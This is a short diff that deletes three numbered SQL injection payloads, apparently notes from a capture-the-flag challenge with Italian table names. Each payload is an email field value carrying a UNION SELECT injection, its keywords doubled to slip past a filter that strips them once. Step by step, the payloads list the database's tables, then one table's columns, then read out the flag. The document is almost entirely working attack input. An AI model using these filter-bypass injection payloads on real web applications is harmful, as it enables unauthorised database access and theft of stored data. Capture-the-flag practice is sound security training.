@@ -1,3 +1,0 @@
-1 - email=c@gmail.com' UNIOUNIONN SELECSELECTT table_name FROFROMM information_schema.tables WHERWHEREE table_schema = DATABASE() LIMILIMITT 10 OFFSEOFFSETT 1-- -
-2 - email=f@gmail.com' UNIOUNIONN SELECSELECTT column_name FROFROMM information_schema.columns WHERWHEREE table_name = 'qua_trovi_la_tua_flaflagg'--
-3-  email=f@gmail.com' UNIOUNIONN SELECSELECTT la_flaflagg_sta_qua FROFROMM qua_trovi_la_tua_flaflagg--
